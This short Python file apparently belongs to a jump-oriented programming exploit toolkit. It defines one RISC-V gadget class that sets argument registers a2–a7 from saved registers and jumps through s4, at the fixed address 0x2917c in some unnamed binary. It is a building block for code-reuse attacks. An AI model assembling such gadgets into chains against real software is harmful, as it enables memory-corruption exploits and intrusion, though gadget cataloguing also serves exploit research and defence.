from jop_gadgets import JOP_Gadget

class InitializeA5_A7(JOP_Gadget):
    '''
    mv a5, s6
    mv a7, s5
    li a6, 0
    li a4, 0
    mv a3, s7
    addi a2, sp, 0x40
    jalr s4
    '''
    def __init__(self):
        super().__init__(0x2917c)